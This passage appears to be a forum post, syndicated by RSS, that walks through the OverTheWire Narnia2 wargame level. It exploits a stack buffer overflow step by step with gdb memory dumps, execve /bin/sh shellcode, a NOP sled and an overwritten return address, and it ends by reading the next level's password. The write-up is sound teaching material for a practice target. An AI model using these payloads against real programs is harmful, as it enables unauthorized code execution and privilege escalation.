 bottom of the stack-&gt;+-----------------+ always points at bottom of stack
                      |       v         |  higher addresses v
</code></pre>
<p>Values on the stack are usually referenced to by their offset from $EBP, the local Base Pointer, which points to the bottom of a functions stack, aka the current stack frame, <em>or</em> they’re referenced by their offset from $ESP, the Stack Pointer, which always points to the top of the stack.</p>
<p>The stack grows when we <strong>call a function</strong>, and decreases in size when we <strong>return from a function</strong>.</p>
<p>Confused? Good. Nobody makes the jump their first time. Simply attacking this binary without understanding the stack actually can work though, following some basic steps. So I’ll now switch back into basic bitch mode. Let’s whip out our giant python and slap my bitch up.</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ pythong -c ‘print -c “A”*136’ | ./narnia2<br>
No command ‘pythong’ found, did you mean:<br>
Command ‘python’ from package ‘python-minimal’ (main)<br>
pythong: command not found</p>
</blockquote>
<p>Fuck, I’ve found this fruedian finger slip one too many times now. Let’s shut it down.</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ alias pythong=‘python’<br>
narnia2@melinda:/games/narnia$ pythong -c ‘print “A<em>132"’ | ./narnia2<br>
narnia2@melinda:/games/narnia$<br>
narnia2@melinda:/games/narnia$ pythong -c 'print "A</em>136”’ | ./narnia2<br>
narnia2@melinda:/games/narnia$<br>
narnia2@melinda:/games/narnia$ pythong -c ‘print “A<em>140"’ | ./narnia2<br>
Illegal Instruction.<br>
narnia2@melinda:/games/narnia$ pythong -c 'print "A</em>144”’ | ./narnia2<br>
Segmentation Fault.</p>
</blockquote>
<p>Ok, <span class="hashtag">#gg</span> sauce in and around my mouth. We got a seg fault boyz. Seg faults are the result of a program crashing because it tried to read or write to an inaccessible memory location. If an attacker can somehow <strong>know the location it is trying to access and have code there waiting for it</strong> or <strong>change the address it is trying to access to be the location of your code</strong>, a program can be exploited.<br>
When we send the program 132 bytes, it over writes the next 4 bytes on the stack, but this does not actually corrupt anything, so the program exits normally. Same with 136 bytes. 140 causes an illegal instruction (explained later or in next tutorial), and 144 smashes the stack to the point of corrupting the return address, causing the program to try to jump to the memory address 0x41414141 when it returns, which is either an illegal address for that program to be accessing, or an address with garbage data at it, and thus the program seg faults… let us take a close look at what is happening in <strong>gdb</strong>, the gnu debugger.</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ gdb<br>
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1<br>
Copyright © 2014 Free Software Foundation, Inc.<br>
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html" rel="nofollow noopener">http://gnu.org/licenses/gpl.html</a><br>
This is free software: you are free to change and redistribute it.<br>
There is NO WARRANTY, to the extent permitted by law.  Type “show copying”<br>
and “show warranty” for details.<br>
This GDB was configured as “x86_64-linux-gnu”.<br>
Type “show configuration” for configuration details.<br>
For bug reporting instructions, please see:<br>
<a href="http://www.gnu.org/software/gdb/bugs/" rel="nofollow noopener">http://www.gnu.org/software/gdb/bugs/</a>.<br>
Find the GDB manual and other documentation resources online at:<br>
<a href="http://www.gnu.org/software/gdb/documentation/" rel="nofollow noopener">http://www.gnu.org/software/gdb/documentation/</a>.<br>
For help, type “help”.<br>
Type “apropos word” to search for commands related to “word”.<br>
(gdb) file narnia2<br>
Reading symbols from narnia2…(no debugging symbols found)…done.<br>
(gdb) set args $(python -c ‘print “A”*144’)<br>
(gdb) run<br>
Starting program: /games/narnia/narnia2 $(python -c ‘print “A”*144’)</p>
</blockquote>
<blockquote>
<p>Program received signal SIGSEGV, Segmentation fault.<br>
0x41414141 in ?? ()<br>
(gdb) set args $(python -c ‘print “A”*143’)<br>
(gdb) run<br>
The program being debugged has been started already.<br>
Start it from the beginning? (y or n) y</p>
</blockquote>
<blockquote>
<p>Starting program: /games/narnia/narnia2 $(python -c ‘print “A”*143’)</p>
</blockquote>
<blockquote>
<p>Program received signal SIGSEGV, Segmentation fault.<br>
0x00414141 in ?? ()<br>
(gdb) set args $(python -c ‘print “A”*140 + “BCDE”’)<br>
(gdb) run<br>
The program being debugged has been started already.<br>
Start it from the beginning? (y or n) y</p>
</blockquote>
<blockquote>
<p>Starting program: /games/narnia/narnia2 $(python -c ‘print “A”*140 + “BCDE”’)</p>
</blockquote>
<blockquote>
<p>Program received signal SIGSEGV, Segmentation fault.<br>
0x45444342 in ?? ()</p>
</blockquote>
<p>So, we confirmed that after 140 bytes, the next 4 bytes smash the stack and overwrite the saved instruction pointer $EIP (which in this case is also the local base pointer $EBP, since we are at the outer most stack frame, or “stack frame 0”). We confirmed that we can control this value. So now what?</p>
<p>Now, we want to change that address to be an address that points to a location in memory that <em>we control</em>. And what do we control? We control the input to <strong>buf[]</strong>, so lets find out where buff is in memory. (Note: buff may actually me in a couple places in memory… as long as where it’s at is executable memory, it’s fine.)</p>
<blockquote>
<p>(gdb) x/40x $esp-0x14<br>
0xffffd63c:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd64c:    0x45444342    0x00000000    0xffffd6e4    0xffffd6f0<br>
0xffffd65c:    0xf7feacca    0x00000002    0xffffd6e4    0xffffd684<br>
0xffffd66c:    0x08049768    0x0804821c    0xf7fc9000    0x00000000<br>
0xffffd67c:    0x00000000    0x00000000    0xb433f6ed    0x8cea72fd<br>
0xffffd68c:    0x00000000    0x00000000    0x00000000    0x00000002<br>
0xffffd69c:    0x08048360    0x00000000    0xf7ff04c0    0xf7e3b9e9<br>
(gdb) x/50x $esp-0x100<br>
0xffffd550:    0xf7fcd2e8    0xf7fcd000    0xffffd574    0x08049758<br>
0xffffd560:    0x0804821c    0x080481bc    0x00000000    0x00000000<br>
0xffffd570:    0x00000000    0xf7e286d4    0xf7e6532b    0xf7fc9000<br>
0xffffd580:    0x00000000    0x00000000    0xffffd648    0xf7e6edff<br>
0xffffd590:    0xf7fc9ac0    0x08048574    0xffffd5b4    0xf7e6edd0<br>
0xffffd5a0:    0xffffd5c0    0xf7ffd938    0xf7fc9000    0x080484bc<br>
0xffffd5b0:    0x08048574    0xffffd5c0    0x00000000    0x00000000<br>
0xffffd5c0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd600:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd610:    0x41414141    0x41414141<br>
(gdb) x/50x $esp-0xdc<br>
0xffffd574:    0xf7e286d4    0xf7e6532b    0xf7fc9000    0x00000000<br>
0xffffd584:    0x00000000    0xffffd648    0xf7e6edff    0xf7fc9ac0<br>
0xffffd594:    0x08048574    0xffffd5b4    0xf7e6edd0    0xffffd5c0<br>
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574<br>
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141<br>
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd634:    0x41414141    0x41414141<br>
(gdb) x/50x $esp-0xcc<br>
0xffffd584:    0x00000000    0xffffd648    0xf7e6edff    0xf7fc9ac0<br>
0xffffd594:    0x08048574    0xffffd5b4    0xf7e6edd0    0xffffd5c0<br>
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574<br>
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141<br>
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd634:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd644:    0x41414141    0x41414141<br>
(gdb) x/50x $esp-0xac<br>
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574<br>
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141<br>
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd634:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd644:    0x41414141    0x41414141    0x45444342    0x00000000<br>
0xffffd654:    0xffffd6e4    0xffffd6f0    0xf7feacca    0x00000002<br>
0xffffd664:    0xffffd6e4    0xffffd684</p>
</blockquote>
<p>Ok, so we can clearly see our buffer of A’s. I went ahead and used <strong>gdb</strong>’s “x” command which <strong>examines</strong> memory at a given register or address. The <strong>“/50x”</strong> after the <strong>“x”</strong> tells <strong>gdb</strong> to print 50 WORDS (or 50 units of this architecture’s default register size, in our case 32 bits = 4 bytes) in <strong>hex</strong>. Doing “x/50s $esp” would print 50 WORDS from $esp and list their values on the right as <strong>string</strong>. While way more readable, I recommend you get used to spotting hex values for your own benefit. The “$esp-0xac” is the address from which I want to examine 50 words. Unfortunately, at this point in our program, the stack has already popped off everything, so it is no longer pointing at 128 bytes + 4 bytes for int argc + 4bytes for char* argv[] + 4 bytes for saved $ebp. It is now pointing way lower at either saved $ebp or $eip, so we need to look at a lower memory address (look higher up if you envision it as a graph that you’re looking at and everything is writing downwards towards higher addresses). Examining the memory, we see that our buffer appears to start around 0xffffd5c0.<br>
Ok, so now lets imagine what input we’re going to send to narnia2 and what its buffer is going to need to look like:</p>
<blockquote>
<p>i-------------------------------------------------------------------------------------|<br>
|-- shellcode --|-- garbage data print “A” --|-- address of shellcode --|<br>
i-------------------------------------------------------------------------------------|</p>
</blockquote>
<p>We refer to the entire chunk of data we are sending as our payload. This is our payload, totallying 144 bytes. The last 4 bytes must be the address to the start of our shellcode (which is the start of the buffer), and shellcode + garbage data must be equal to 140 bytes. So garbage data = 140 - shellcode.</p>
<p>Let us get the length of our shellcode. We have our k̶n̶o̶w̶n̶ ̶w̶o̶r̶k̶i̶n̶g̶ (<strong>LOL</strong>) shellcode from narnia1 so we just need to find its length. We’re lazy though and wouldn’t want to terminate our gdb session… in order to execute bash commands within gdb, use <strong>!</strong> at the beginning of the line.</p>
<blockquote>
<p>(gdb) !python -c ‘print len("\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")’<br>
49<br>
(gdb) set args $(pythong -c ‘print “\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43” + “A”*91 + “\xc0\xd5\xff\xff”’)<br>
(gdb) run</p>
</blockquote>
<blockquote>
<p>Starting program: /games/narnia/narnia2 $(pythong -c ‘print “\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43” + “A”*91 + “\xc0\xd5\xff\xff”’)<br>
���������������������^1��F[Inferior 1 (process 25969) exited normally]</p>
</blockquote>
<p>Hmmmm… peculiar. It seems to have run, but not popped a shell… This should have worked. Memory is tricky sometimes, maybe it landed in the middle of this shellcode and since the whole thing didn’t get ran it didn’t work… Let’s try putting a nopsled at the front in case we math’d wrong. (Note: lots of my asterixs and shit just disappear so you can’t quite just copy paste this and have to understand what is going on to do it on your own… any questions send me a message or yell at me in IRC)</p>
<blockquote>
<p>(gdb) set args $(python -c ‘print “\x90”*51 + “\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43” + "\xc8\xd5\xff\xff"11’)<br>
(gdb) run<br>
The program being debugged has been started already.<br>
Start it from the beginning? (y or n) y</p>
</blockquote>
<blockquote>
<p>Starting program: /bin/dash $(python -c ‘print “\x90”*51 + “\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43” + “\xc0\xd5\xff\xff”*11’)<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
/bin/dash: 0: Can’t open ����������������������������������������������������^1��F<br>
[Inferior 1 (process 28745)</p>
</blockquote>
<p>Hmmmm, so I added a nopsled and it still didn’t work. I added a nopsled and spammed my retrun address 11 times (bytes 100 to 144) to make sure that I wasn’t math’ing that wrong either… Check back here sometime for another installment of why shit works here and not there, where I figure this one out. But for now, lets just grab new shellcode…</p>
<p>And fuck that whole process of looking everywhere for it… let’s just see what other people used in narnia tutorials around the web so I don’t pull my hair out.<br>
Ok, the most used shellcode that works reliably in exploits is:</p>
<blockquote>
<p>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80</p>
</blockquote>
<p>So lets try that again, shall we?</p>
<blockquote>
<p>(gdb) !python -c ‘print len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")’<br>
25</p>
</blockquote>
<p>140 - 25 = 115 garbage bytes.</p>
<blockquote>
<p>(gdb) set args $(python -c 'print “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80” + “A”*115 “\xc8\xd5\xff\xff”)<br>
(gdb) run<br>
Breakpoint 1, 0x080484c1 in main ()<br>
(gdb) c<br>
Continuing.<br>
process 27690 is executing new program: /bin/dash<br>
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the “file” command.<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
Error in re-setting breakpoint 1: No symbol “main” in current context.<br>
$ ls<br>
narnia0    narnia1    narnia2     narnia3    narnia4    narnia5      narnia6    narnia7    narnia8<br>
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c    narnia8.c<br>
$whoami<br>
narnia2<br>
$exit<br>
(gdb)</p>
</blockquote>
<p>At this point I had inserted a breakpoint earlier to see what was going on (I had previously too but didn’t mention anything). We’ll go wayyyyy more in depth with <strong>gdb</strong> in the future to see just how powerful and useful it can be when debugging. But for now, this is all you need to know. Unfortuntely, our exploit breaks out of narnia2 binary, but gains privileges of the user running gdb, which is narnia2. So we have to do this <strong>outside of gdb</strong> for it to work correctly. Sometimes some things don’t work correctly in <strong>gdb</strong>, as their are certain Op codes reserved for certain tasks in <strong>gdb</strong>… which is highly likely why that shellcode worked in narna1 and then not in narnia2. All that’s left to do is insert our payload into narnia2 and grab the password to narnia3. Science, Bitches.</p>
<blockquote>
<p>(gdb) quit<br>
narnia2@melinda:/games/narnia$ ./narnia2 $(python -c ‘print “\x90”*75 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80” + “\xc8\xd5\xff\xff”*11’)<br>
$<br>
$ whoami<br>
narnia3<br>
$ cd /etc/narnia_pass/<br>
$ ls<br>
narnia0  narnia2  narnia4  narnia6  narnia8<br>
narnia1  narnia3  narnia5  narnia7  narnia9<br>
$ cat narnia3</p>
</blockquote>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/1</link>
        <pubDate>Wed, 06 Jul 2016 19:18:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-1</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
  </channel>
</rss>
